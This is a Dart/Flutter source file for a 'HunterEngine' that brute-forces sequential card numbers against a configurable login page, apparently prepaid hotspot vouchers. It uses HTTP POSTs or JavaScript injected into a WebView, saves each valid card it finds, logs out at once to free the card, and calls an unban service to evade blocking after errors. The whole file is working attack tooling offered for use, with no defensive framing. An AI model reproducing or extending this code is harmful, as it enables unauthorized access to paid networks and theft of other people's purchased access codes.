import 'dart:async';
import 'package:dio/dio.dart';
import 'package:webview_flutter/webview_flutter.dart';
import '../../core/utils/number_formatter.dart';
import '../../core/utils/sound_helper.dart';
import '../../data/datasources/database_helper.dart';
import '../../data/datasources/unban_service.dart';
import '../../data/models/settings_model.dart';

enum EngineStatus { ready, running, paused, stopping, unbanning, error }

class HunterEngine {
  final DatabaseHelper db;

  // Callbacks
  final void Function(String message)? onLog;
  final void Function(String currentNum, int attempts, int found, int unbans)? onStats;
  final void Function(String cardNumber, String loginUrl)? onFound;
  final void Function(EngineStatus status, String message)? onStatusChange;
  final void Function()? onFinished;

  bool _isRunning = false;
  bool _isPaused = false;
  bool _stopRequested = false;

  bool get isRunning => _isRunning;
  bool get isPaused => _isPaused;

  String currentNumber = '';
  int totalAttempts = 0;
  int foundCount = 0;
  int unbanCount = 0;
  int consecutiveErrors = 0;

  late Dio _dio;
  WebViewController? _webViewController;

  HunterEngine({
    required this.db,
    this.onLog,
    this.onStats,
    this.onFound,
    this.onStatusChange,
    this.onFinished,
  }) {
    _initDio();
  }

  void _initDio([int timeoutMs = 15000]) {
    _dio = Dio(
      BaseOptions(
        connectTimeout: Duration(milliseconds: timeoutMs),
        receiveTimeout: Duration(milliseconds: timeoutMs),
        sendTimeout: Duration(milliseconds: timeoutMs),
        validateStatus: (status) => status != null && status < 500,
        headers: {
          'User-Agent':
              'Mozilla/5.0 (Linux; Android 13; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        },
      ),
    );
  }

  Future<void> start(SettingsModel config) async {
    if (_isRunning) return;

    _isRunning = true;
    _isPaused = false;
    _stopRequested = false;
    consecutiveErrors = 0;

    _runLoop(config);
  }

  void pause() {
    if (_isRunning && !_isPaused) {
      _isPaused = true;
      onStatusChange?.call(EngineStatus.paused, 'متوقف مؤقتاً ⏸️');
      onLog?.call('⏸ تم إيقاف عملية الفحص مؤقتاً.');
    }
  }

  void resume() {
    if (_isRunning && _isPaused) {
      _isPaused = false;
      onStatusChange?.call(EngineStatus.running, 'قيد الفحص والاصطياد... 🚀');
      onLog?.call('▶ تم استئناف عملية الفحص.');
    }
  }

  void stop() {
    if (_isRunning) {
      _stopRequested = true;
      onStatusChange?.call(EngineStatus.stopping, 'جاري الإيقاف... ⏳');
      onLog?.call('⏹ جاري إيقاف الفحص وإنهاء الجلسة بأمان...');
    }
  }

  Future<void> _runLoop(SettingsModel config) async {
    onStatusChange?.call(EngineStatus.running, 'قيد الفحص والاصطياد... 🚀');
    onLog?.call('🚀 بدء تشغيل محرك الفحص المتطور...');
    if (config.useWebView) {
      onLog?.call('🌐 استخدام محرك المتصفح التفاعلي (WebKit Browser Engine - مطابق لبايثون 100%)');
    } else {
      onLog?.call('⚡ استخدام محرك الطلبات المباشرة (Direct HTTP Engine)');
    }

    _initDio(config.navTimeout);

    // استرجاع رقم البداية
    final savedLast = await db.getState('last_tested_number');
    if (config.resumeSaved && savedLast != null && savedLast.isNotEmpty) {
      currentNumber = savedLast;
      onLog?.call('📂 استئناف من آخر رقم محفوظ في قاعدة البيانات: $currentNumber');
    } else {
      currentNumber = config.startNumber;
      onLog?.call('🆕 بدء الفحص من الرقم: $currentNumber');
    }

    final baseUrl = config.url.replaceAll(RegExp(r'/+$'), '');
    final loginUrl = '$baseUrl${config.loginPath}';
    final logoutUrl = '$baseUrl${config.logoutPath}';

    // تهيئة الـ WebViewController إذا كان خيار المتصفح مفعلاً
    if (config.useWebView) {
      _webViewController = WebViewController()
        ..setJavaScriptMode(JavaScriptMode.unrestricted);
    }

    try {
      int attempt = 0;
      while (!_stopRequested) {
        attempt++;

        // معالجة الإيقاف المؤقت
        while (_isPaused && !_stopRequested) {
          await Future.delayed(const Duration(milliseconds: 500));
        }

        if (_stopRequested) break;

        if (config.maxAttempts > 0 && attempt > config.maxAttempts) {
          onLog?.call('🏁 تم الوصول إلى الحد الأقصى للمحاولات المحدد (${config.maxAttempts}).');
          break;
        }

        totalAttempts = attempt;
        onStats?.call(currentNumber, totalAttempts, foundCount, unbanCount);
        onLog?.call('--- المحاولة $attempt | فحص الرقم: $currentNumber ---');

        // الانتظار بين المحاولات
        if (config.delayBetween > 0) {
          await Future.delayed(Duration(milliseconds: (config.delayBetween * 1000).toInt()));
        }

        if (_stopRequested) break;

        // تنفيذ خطوة فحص تسجيل الدخول
        try {
          bool isSuccess = false;
          String finalUrl = loginUrl;

          if (config.useWebView && _webViewController != null) {
            final res = await _tryLoginStepWebView(
              controller: _webViewController!,
              loginUrl: loginUrl,
              username: currentNumber,
              timeoutMs: config.navTimeout,
              postNavWait: config.postNavWait,
            );
            isSuccess = res['success'] as bool;
            finalUrl = res['url'] as String;
          } else {
            isSuccess = await _tryLoginStepHttp(
              loginUrl: loginUrl,
              username: currentNumber,
              password: config.customPassword.isNotEmpty ? config.customPassword : currentNumber,
              usernameField: config.usernameField,
              passwordField: config.passwordField,
            );
          }

          consecutiveErrors = 0;

          if (!isSuccess) {
            onLog?.call('  ❌ عاد لصفحة الدخول — الرقم غير صحيح: $currentNumber');
            await db.setState('last_tested_number', currentNumber);
            currentNumber = NumberFormatter.nextNumber(currentNumber);
            continue;
          }

          // تم اصطياد كرت صحيح!
          foundCount++;
          onLog?.call('🎉 تم اصطياد كرت صحيح بنجاح! الرقم: $currentNumber (الرابط: $finalUrl)');
          await db.saveFoundCard(currentNumber, finalUrl);
          onFound?.call(currentNumber, finalUrl);
          onStats?.call(currentNumber, totalAttempts, foundCount, unbanCount);

          // تشغيل صوت التنبيه
          SoundHelper.playAlert(isError: false);

          final nextNum = NumberFormatter.nextNumber(currentNumber);
          await db.setState('last_tested_number', nextNum);

          // تسجيل الخروج فوراً لتحرير الكرت
          try {
            onLog?.call('  🚪 جاري تسجيل الخروج من الشبكة لتحرير الكرت...');
            if (config.useWebView && _webViewController != null) {
              await _webViewController!.loadRequest(Uri.parse(logoutUrl));
              await Future.delayed(const Duration(seconds: 1));
            } else {
              await _dio.get(logoutUrl);
            }
          } catch (ex) {
            onLog?.call('  ⚠️ تنبيه أثناء طلب تسجيل الخروج: $ex');
          }

          currentNumber = nextNum;
        } catch (e) {
          // حدوث خطأ شبكة أو حظر
          consecutiveErrors++;
          onLog?.call('  ❌ خطأ في الاتصال/البوابة: $e');
          await db.setState('last_tested_number', currentNumber);
          SoundHelper.playAlert(isError: true);

          if (config.unbanOnError && consecutiveErrors <= config.unbanMaxRetries) {
            for (int retry = 0; retry < config.unbanMaxRetries; retry++) {
              if (_stopRequested) break;
              onStatusChange?.call(EngineStatus.unbanning, 'جاري فك الحظر (محاولة ${retry + 1}/${config.unbanMaxRetries})... 🔓');
              onLog?.call('  🔓 تنفيذ فك الحظر ${retry + 1}/${config.unbanMaxRetries}...');

              final result = await UnbanService.performUnban(log: onLog);
              if (result['success'] == true) {
                unbanCount++;
                onStats?.call(currentNumber, totalAttempts, foundCount, unbanCount);
                break;
              }
              await Future.delayed(Duration(seconds: config.unbanCooldown.toInt()));
            }
          } else if (consecutiveErrors > config.maxConsecutiveErrors) {
            onLog?.call('  🛑 تم بلوغ الحد الأقصى للأخطاء المتتالية ($consecutiveErrors) — توقف مؤقت لحماية الشبكة.');
            pause();
            continue;
          }

          await Future.delayed(Duration(seconds: config.unbanCooldown.toInt()));
          continue; // إعادة التجربة على نفس الرقم بعد فك الحظر
        }
      }
    } finally {
      await db.setState('last_tested_number', currentNumber);
      onLog?.call('💾 تم حفظ آخر رقم تم التوقف عنده: $currentNumber');

      _isRunning = false;
      _isPaused = false;
      onStatusChange?.call(EngineStatus.ready, 'جاهز ومستعد 🟢');
      onFinished?.call();
      onLog?.call('🛑 اكتمل إيقاف محرك الفحص بنجاح.');
    }
  }

  /// تنفيذ فحص تسجيل الدخول عبر محرك المتصفح الحقيقي (مطابق لبايثون 100%)
  Future<Map<String, dynamic>> _tryLoginStepWebView({
    required WebViewController controller,
    required String loginUrl,
    required String username,
    required int timeoutMs,
    required double postNavWait,
  }) async {
    final completer = Completer<Map<String, dynamic>>();

    controller.setNavigationDelegate(
      NavigationDelegate(
        onPageFinished: (url) async {
          // عند تحميل صفحة البداية، ننفذ الكود البرمجي لحقن الكرت والنقر
          if (url.toLowerCase().contains('login') || url == loginUrl) {
            final jsCode = '''
              (function() {
                var u = document.querySelector('#username') || document.querySelector('input[name="username"]');
                if (u) {
                  u.value = '$username';
                  u.dispatchEvent(new Event('input', { bubbles: true }));
                  u.dispatchEvent(new Event('change', { bubbles: true }));
                }
                var btn = document.querySelector('input[type="button"]');
                if (btn) {
                  btn.click();
                }
                var popup = document.getElementById('popup');
                if (popup) {
                  popup.style.display = 'block';
                }
                setTimeout(function() {
                  var sub = document.querySelector('#popup input[type="submit"]') || document.querySelector('input[type="submit"]');
                  if (sub) {
                    sub.click();
                  } else {
                    if (document.forms.length > 0) document.forms[0].submit();
                  }
                }, 400);
              })();
            ''';
            try {
              await controller.runJavaScript(jsCode);
            } catch (_) {}
          } else {
            // إذا تغير الرابط وأصبح غير login (مثل /status أو صفحة النجاح)
            if (!completer.isCompleted) {
              final isSuccess = !url.toLowerCase().contains('login');
              completer.complete({'success': isSuccess, 'url': url});
            }
          }
        },
        onWebResourceError: (err) {
          if (!completer.isCompleted) {
            completer.completeError(Exception('فشل تحميل الصفحة: ${err.description}'));
          }
        },
      ),
    );

    // تحميل صفحة الدخول
    await controller.loadRequest(Uri.parse(loginUrl));

    // انتظار النتيجة أو انتهاء المهلة
    final timeout = Duration(milliseconds: timeoutMs);
    final startTime = DateTime.now();

    while (!completer.isCompleted && DateTime.now().difference(startTime) < timeout) {
      await Future.delayed(const Duration(milliseconds: 300));

      final curUrl = await controller.currentUrl() ?? '';
      if (curUrl.isNotEmpty && !curUrl.toLowerCase().contains('login') && curUrl != loginUrl) {
        if (!completer.isCompleted) {
          completer.complete({'success': true, 'url': curUrl});
          break;
        }
      }

      // فحص محتوى الصفحة للتأكد مما إذا كانت رسالة النجاح قد ظهرت
      try {
        final bodyText = (await controller.runJavaScriptReturningResult('document.body ? document.body.innerText : ""')).toString();
        if (bodyText.contains('تم تسجيل الدخول بنجاح') || bodyText.contains('status')) {
          if (!completer.isCompleted) {
            completer.complete({'success': true, 'url': curUrl});
            break;
          }
        }
      } catch (_) {}
    }

    if (!completer.isCompleted) {
      final finalUrl = await controller.currentUrl() ?? loginUrl;
      final isSuccess = finalUrl != loginUrl && !finalUrl.toLowerCase().contains('login');
      return {'success': isSuccess, 'url': finalUrl};
    }

    return completer.future;
  }

  /// إرسال طلب تسجيل الدخول المباشر السريع عبر HTTP
  Future<bool> _tryLoginStepHttp({
    required String loginUrl,
    required String username,
    required String password,
    required String usernameField,
    required String passwordField,
  }) async {
    final response = await _dio.post(
      loginUrl,
      data: {
        usernameField: username,
        passwordField: password,
      },
      options: Options(
        contentType: Headers.formUrlEncodedContentType,
        followRedirects: false,
      ),
    );

    final statusCode = response.statusCode ?? 0;
    final location = response.headers.value('location') ?? '';
    final body = response.data.toString().toLowerCase();

    if (statusCode == 302 || statusCode == 303 || statusCode == 301) {
      if (location.isNotEmpty && !location.toLowerCase().contains('login')) {
        return true;
      }
    }

    if (statusCode == 200) {
      if (body.contains('logout') ||
          body.contains('logged in') ||
          body.contains('connected') ||
          body.contains('نجاح') ||
          body.contains('status') ||
          body.contains('متصل')) {
        return true;
      }
    }

    return false;
  }
}
